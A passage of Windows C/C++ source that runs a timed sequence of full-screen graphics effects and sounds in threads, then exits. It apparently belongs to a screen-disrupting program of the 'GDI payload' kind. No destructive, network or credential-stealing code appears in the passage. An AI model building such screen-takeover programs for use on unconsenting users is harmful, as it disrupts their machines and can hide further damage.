            InvalidateRect(0, 0, 0);
            HANDLE plgblt1 = CreateThread(0, 0, PlgBlt1, 0, 0, 0);
            sound2();
            Sleep(15000);
            TerminateThread(plgblt1, 0);
            CloseHandle(plgblt1);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt2 = CreateThread(0, 0, PlgBlt2, 0, 0, 0);
            Sleep(15000);
            TerminateThread(plgblt2, 0);
            CloseHandle(plgblt2);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt3 = CreateThread(0, 0, PlgBlt3, 0, 0, 0);
            Sleep(15000);
            TerminateThread(plgblt3, 0);
            CloseHandle(plgblt3);
            InvalidateRect(0, 0, 0);
            HANDLE plgblt4 = CreateThread(0, 0, PlgBlt4, 0, 0, 0);
            Sleep(15000);
            TerminateThread(plgblt4, 0);
            CloseHandle(plgblt4);
            InvalidateRect(0, 0, 0);
            HANDLE shader2 = CreateThread(0, 0, Shader2, 0, 0, 0);
            sound3();
            Sleep(15000);
            TerminateThread(shader2, 0);
            CloseHandle(shader2);
            HANDLE shader3 = CreateThread(0, 0, Shader3, 0, 0, 0);
            Sleep(15000);
            TerminateThread(shader3, 0);
            CloseHandle(shader3);
            HANDLE shader4 = CreateThread(0, 0, Shader4, 0, 0, 0);
            Sleep(15000);
            TerminateThread(shader4, 0);
            CloseHandle(shader4);
            HANDLE shader5 = CreateThread(0, 0, Shader5, 0, 0, 0);
            Sleep(15000);
            TerminateThread(shader5, 0);
            CloseHandle(shader5);
            InvalidateRect(0, 0, 0);
            HANDLE bouncingsquare1 = CreateThread(0, 0, BouncingSquare1, 0, 0, 0);
            HANDLE shader6 = CreateThread(0, 0, Shader6, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(bouncingsquare1, 0);
            CloseHandle(bouncingsquare1);
            TerminateThread(shader6, 0);
            CloseHandle(shader6);
            InvalidateRect(0, 0, 0);
            HANDLE bouncingsquare2 = CreateThread(0, 0, BouncingSquare2, 0, 0, 0);
            HANDLE bouncingcircle1 = CreateThread(0, 0, BouncingCircle1, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(bouncingsquare2, 0);
            CloseHandle(bouncingsquare2);
            TerminateThread(bouncingcircle1, 0);
            CloseHandle(bouncingcircle1);
            InvalidateRect(0, 0, 0);
            HANDLE blur1 = CreateThread(0, 0, Blur1, 0, 0, 0);
            HANDLE bitblt1 = CreateThread(0, 0, BitBlt1, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(blur1, 0);
            CloseHandle(blur1);
            TerminateThread(bitblt1, 0);
            CloseHandle(bitblt1);
            InvalidateRect(0, 0, 0);
            HANDLE sin1 = CreateThread(0, 0, Sin1, 0, 0, 0);
            soundlast();
            Sleep(30000);
            TerminateThread(sin1, 0);
            CloseHandle(sin1);
            InvalidateRect(0, 0, 0);
            ExitProcess(0);
        }
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////